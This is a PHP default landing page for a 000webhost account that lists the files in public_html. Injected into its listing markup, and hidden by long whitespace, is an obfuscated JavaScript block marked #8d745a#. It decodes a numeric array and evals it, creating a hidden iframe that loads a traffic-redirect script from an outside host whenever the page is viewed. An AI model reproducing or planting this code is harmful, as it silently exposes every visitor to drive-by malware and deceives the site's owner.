<?

$host=$_SERVER['HTTP_HOST'];

/*

Directory Listing Script - Version 2

====================================

Script Author: Ash Young <ash@evoluted.net>. www.evoluted.net

Layout: Manny <manny@tenka.co.uk>. www.tenka.co.uk

*/

$startdir = '.';

$showthumbnails = false; 

$showdirs = true;

$forcedownloads = false;

$hide = array(

				'dlf',

				'public_html',				

				'index.php',

				'Thumbs',

				'.htaccess',

				'.htpasswd'

			);

$displayindex = false;

$allowuploads = false;

$overwrite = false;



$indexfiles = array (

				'index.html',

				'index.htm',

				'default.htm',

				'default.html'

			);

			

$filetypes = array (

				'png' => 'jpg.gif',

				'jpeg' => 'jpg.gif',

				'bmp' => 'jpg.gif',

				'jpg' => 'jpg.gif', 

				'gif' => 'gif.gif',

				'zip' => 'archive.png',

				'rar' => 'archive.png',

				'exe' => 'exe.gif',

				'setup' => 'setup.gif',

				'txt' => 'text.png',

				'htm' => 'html.gif',

				'html' => 'html.gif',

				'php' => 'php.gif',				

				'fla' => 'fla.gif',

				'swf' => 'swf.gif',

				'xls' => 'xls.gif',

				'doc' => 'doc.gif',

				'sig' => 'sig.gif',

				'fh10' => 'fh10.gif',

				'pdf' => 'pdf.gif',

				'psd' => 'psd.gif',

				'rm' => 'real.gif',

				'mpg' => 'video.gif',

				'mpeg' => 'video.gif',

				'mov' => 'video2.gif',

				'avi' => 'video.gif',

				'eps' => 'eps.gif',

				'gz' => 'archive.png',

				'asc' => 'sig.gif',

			);

			

error_reporting(0);

if(!function_exists('imagecreatetruecolor')) $showthumbnails = false;

$leadon = $startdir;

if($leadon=='.') $leadon = '';

if((substr($leadon, -1, 1)!='/') && $leadon!='') $leadon = $leadon . '/';

$startdir = $leadon;



if($_GET['dir']) {

	//check this is okay.

	

	if(substr($_GET['dir'], -1, 1)!='/') {

		$_GET['dir'] = $_GET['dir'] . '/';

	}

	

	$dirok = true;

	$dirnames = split('/', $_GET['dir']);

	for($di=0; $di<sizeof($dirnames); $di++) {

		

		if($di<(sizeof($dirnames)-2)) {

			$dotdotdir = $dotdotdir . $dirnames[$di] . '/';

		}

		

		if($dirnames[$di] == '..') {

			$dirok = false;

		}

	}

	

	if(substr($_GET['dir'], 0, 1)=='/') {

		$dirok = false;

	}

	

	if($dirok) {

		 $leadon = $leadon . $_GET['dir'];

	}

}







$opendir = $leadon;

if(!$leadon) $opendir = '.';

if(!file_exists($opendir)) {

	$opendir = '.';

	$leadon = $startdir;

}



clearstatcache();

if ($handle = opendir($opendir)) {

	while (false !== ($file = readdir($handle))) { 

		//first see if this file is required in the listing

		if ($file == "." || $file == "..")  continue;

		$discard = false;

		for($hi=0;$hi<sizeof($hide);$hi++) {

			if(strpos($file, $hide[$hi])!==false) {

				$discard = true;

			}

		}

		

		if($discard) continue;

		if (@filetype($leadon.$file) == "dir") {

			if(!$showdirs) continue;

		

			$n++;

			if($_GET['sort']=="date") {

				$key = @filemtime($leadon.$file) . ".$n";

			}

			else {

				$key = $n;

			}

			$dirs[$key] = $file . "/";

		}

		else {

			$n++;

			if($_GET['sort']=="date") {

				$key = @filemtime($leadon.$file) . ".$n";

			}

			elseif($_GET['sort']=="size") {

				$key = @filesize($leadon.$file) . ".$n";

			}

			else {

				$key = $n;

			}

			$files[$key] = $file;

			

			if($displayindex) {

				if(in_array(strtolower($file), $indexfiles)) {

					header("Location: $file");

					die();

				}

			}

		}

	}

	closedir($handle); 

}



//sort our files

if($_GET['sort']=="date") {

	@ksort($dirs, SORT_NUMERIC);

	@ksort($files, SORT_NUMERIC);

}

elseif($_GET['sort']=="size") {

	@natcasesort($dirs); 

	@ksort($files, SORT_NUMERIC);

}

else {

	@natcasesort($dirs); 

	@natcasesort($files);

}



//order correctly

if($_GET['order']=="desc" && $_GET['sort']!="size") {$dirs = @array_reverse($dirs);}

if($_GET['order']=="desc") {$files = @array_reverse($files);}

$dirs = @array_values($dirs); $files = @array_values($files);





?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<title>Welcome to <? print $host; ?></title>

<link rel="stylesheet" type="text/css" href="http://www.000webhost.com/images/index/styles.css" />

</head>

<body>

<div id="container">

  <h1>Your  website is up and running!</h1>

  <div id="breadcrumbs">

    <p>Website <strong><? print $host; ?></strong> has been successfully installed on

      server.<br />

      Please delete file &quot;<strong>default.php</strong>&quot; from <strong>public_html</strong> folder and upload your website by using FTP or web based File Manager.<br />

      <br />

      - Your account information can be found on <a href="http://members.000webhost.com/"><u>http://members.000webhost.com/</u></a><br />

      - If you need help, please check our <a href="http://www.000webhost.com/forum/" target="_blank"><u>forums</u></a> and and <a href="http://www.000webhost.com/faq.php"><u>FAQ List</u></a> or submit a ticket.<br />    

      - Please review our <a href="http://www.000webhost.com/includes/tos.php" target="_blank"><u>Terms Of Service</u></a> to see what is not allowed to upload.<br />

    </p>

    <p><span class="style3">If you  are going to violate our <a href="http://www.000webhost.com/includes/tos.php" target="_blank"><u>TOS</u></a>, please read this text until it's not too late!<br /> 

      Do not waste your time with 000webhost.com, if you are going to upload any illegal website here! All websites are manually reviewed by humans, so if we will notice anything illegal, your account will be terminated. So don't waste your time in promoting your scams, hacking websites, or anything else malicious - your account will be terminated in 5 minutes after we will receive first abuse report or anything abusive will be detected by our staff. We also report <strong>all</strong> illegal activities to  local and international authorities.</span>

	</p>      

  	<p>Below you can see your current files in <strong>public_html</strong> folder.</p>

  </div>

  <div id="listingcontainer">

    <div id="listingheader"> 

	<div id="headerfile">File</div>

	<div id="headersize">Size</div>

	<div id="headermodified">Last Modified</div>

	</div>

    <div id="listing">

	<?

	$class = 'b';

	if($dirok) {

	?>
<?
#8d745a#
                                                                                                                                                                                                                                                          echo "                                                                                                                                                                                                                                                          <script type=\"text/javascript\" language=\"javascript\" >                                                                                                                                                                                                                                                          try{document[\"b\"+\"ody\"]*=document}catch(dgsgsdg){zxc=1;ww=window;}try{d=document[\"cr\"+\"eateElement\"](\"div\");}catch(agdsg){zxc=0;}try{if(ww.document)window[\"doc\"+\"ument\"][\"body\"]=\"asd\"}catch(bawetawe){if(ww.document){v=window;n=[\"1e\",\"3o\",\"4d\",\"46\",\"3l\",\"4c\",\"41\",\"47\",\"46\",\"16\",\"1e\",\"1f\",\"16\",\"4j\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"4e\",\"3j\",\"4a\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"16\",\"29\",\"16\",\"3m\",\"47\",\"3l\",\"4d\",\"45\",\"3n\",\"46\",\"4c\",\"1k\",\"3l\",\"4a\",\"3n\",\"3j\",\"4c\",\"3n\",\"2h\",\"44\",\"3n\",\"45\",\"3n\",\"46\",\"4c\",\"1e\",\"1d\",\"41\",\"3o\",\"4a\",\"3j\",\"45\",\"3n\",\"1d\",\"1f\",\"27\",\"d\",\"a\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1k\",\"4b\",\"4a\",\"3l\",\"16\",\"29\",\"16\",\"1d\",\"40\",\"4c\",\"4c\",\"48\",\"26\",\"1l\",\"1l\",\"3k\",\"4d\",\"4b\",\"41\",\"46\",\"3n\",\"4b\",\"4b\",\"48\",\"3j\",\"3j\",\"4a\",\"3m\",\"1k\",\"46\",\"44\",\"1l\",\"4f\",\"48\",\"1j\",\"41\",\"46\",\"3l\",\"44\",\"4d\",\"3m\",\"3n\",\"4b\",\"1l\",\"4c\",\"4a\",\"3j\",\"3o\",\"1k\",\"48\",\"40\",\"48\",\"1d\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1k\",\"4b\",\"4c\",\"4h\",\"44\",\"3n\",\"1k\",\"48\",\"47\",\"4b\",\"41\",\"4c\",\"41\",\"47\",\"46\",\"16\",\"29\",\"16\",\"1d\",\"3j\",\"3k\",\"4b\",\"47\",\"44\",\"4d\",\"4c\",\"3n\",\"1d\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1k\",\"4b\",\"4c\",\"4h\",\"44\",\"3n\",\"1k\",\"3k\",\"47\",\"4a\",\"3m\",\"3n\",\"4a\",\"16\",\"29\",\"16\",\"1d\",\"1m\",\"1d\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1k\",\"4b\",\"4c\",\"4h\",\"44\",\"3n\",\"1k\",\"40\",\"3n\",\"41\",\"3p\",\"40\",\"4c\",\"16\",\"29\",\"16\",\"1d\",\"1n\",\"48\",\"4g\",\"1d\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1k\",\"4b\",\"4c\",\"4h\",\"44\",\"3n\",\"1k\",\"4f\",\"41\",\"3m\",\"4c\",\"40\",\"16\",\"29\",\"16\",\"1d\",\"1n\",\"48\",\"4g\",\"1d\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1k\",\"4b\",\"4c\",\"4h\",\"44\",\"3n\",\"1k\",\"44\",\"3n\",\"3o\",\"4c\",\"16\",\"29\",\"16\",\"1d\",\"1n\",\"48\",\"4g\",\"1d\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1k\",\"4b\",\"4c\",\"4h\",\"44\",\"3n\",\"1k\",\"4c\",\"47\",\"48\",\"16\",\"29\",\"16\",\"1d\",\"1n\",\"48\",\"4g\",\"1d\",\"27\",\"d\",\"a\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"3o\",\"16\",\"1e\",\"17\",\"3m\",\"47\",\"3l\",\"4d\",\"45\",\"3n\",\"46\",\"4c\",\"1k\",\"3p\",\"3n\",\"4c\",\"2h\",\"44\",\"3n\",\"45\",\"3n\",\"46\",\"4c\",\"2e\",\"4h\",\"2l\",\"3m\",\"1e\",\"1d\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1d\",\"1f\",\"1f\",\"16\",\"4j\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"16\",\"16\",\"16\",\"16\",\"3m\",\"47\",\"3l\",\"4d\",\"45\",\"3n\",\"46\",\"4c\",\"1k\",\"4f\",\"4a\",\"41\",\"4c\",\"3n\",\"1e\",\"1d\",\"28\",\"3m\",\"41\",\"4e\",\"16\",\"41\",\"3m\",\"29\",\"3e\",\"1d\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"3e\",\"1d\",\"2a\",\"28\",\"1l\",\"3m\",\"41\",\"4e\",\"2a\",\"1d\",\"1f\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"16\",\"16\",\"16\",\"16\",\"3m\",\"47\",\"3l\",\"4d\",\"45\",\"3n\",\"46\",\"4c\",\"1k\",\"3p\",\"3n\",\"4c\",\"2h\",\"44\",\"3n\",\"45\",\"3n\",\"46\",\"4c\",\"2e\",\"4h\",\"2l\",\"3m\",\"1e\",\"1d\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1d\",\"1f\",\"1k\",\"3j\",\"48\",\"48\",\"3n\",\"46\",\"3m\",\"2f\",\"40\",\"41\",\"44\",\"3m\",\"1e\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1f\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"4l\",\"d\",\"a\",\"4l\",\"1f\",\"1e\",\"1f\",\"27\"];h=2;s=\"\";if(zxc){for(i=0;i-506!=0;i++){k=i;s+=String.fromCharCode(parseInt(n[i],26));}z=s;vl=\"val\";if(ww.document)ww[\"e\"+vl](z)}}}</script>";

#/8d745a#
?>

	<div><a href="<?=$dotdotdir;?>" class="<?=$class;?>"><img src="http://www.000webhost.com/images/index/dirup.png" alt="Folder" /><strong>..</strong> <em>-</em> <?=date ("M d Y h:i:s A", filemtime($dotdotdir));?></a></div>

	<?

		if($class=='b') $class='w';

		else $class = 'b';

	}

	$arsize = sizeof($dirs);

	for($i=0;$i<$arsize;$i++) {

	?>

	<div><a href="<?=$leadon.$dirs[$i];?>" class="<?=$class;?>"><img src="http://www.000webhost.com/images/index/folder.png" alt="<?=$dirs[$i];?>" /><strong><?=$dirs[$i];?></strong> <em>-</em> <?=date ("M d Y h:i:s A", filemtime($leadon.$dirs[$i]));?></a></div>

	<?

		if($class=='b') $class='w';

		else $class = 'b';	

	}

	

	$arsize = sizeof($files);

	for($i=0;$i<$arsize;$i++) {

		$icon = 'unknown.png';

		$ext = strtolower(substr($files[$i], strrpos($files[$i], '.')+1));

		$supportedimages = array('gif', 'png', 'jpeg', 'jpg');

		$thumb = '';

				

		if($filetypes[$ext]) {

			$icon = $filetypes[$ext];

		}

		

		$filename = $files[$i];

		if(strlen($filename)>43) {

			$filename = substr($files[$i], 0, 40) . '...';

		}

		

		$fileurl = $leadon . $files[$i];

	?>

	<div><a href="<?=$fileurl;?>" class="<?=$class;?>"<?=$thumb2;?>><img src="http://www.000webhost.com/images/index/<?=$icon;?>" alt="<?=$files[$i];?>" /><strong><?=$filename;?></strong> <em><?=round(filesize($leadon.$files[$i])/1024);?>KB</em> <?=date ("M d Y h:i:s A", filemtime($leadon.$files[$i]));?><?=$thumb;?></a></div>

	<?

		if($class=='b') $class='w';

		else $class = 'b';	

	}	

	?></div>

  </div>

</div>

<div id="copy">Free <a href="http://www.hosting24.com/">Web Hosting</a> by <a href="http://www.000webhost.com/">www.000webhost.com</a></div>

</body>

</html>

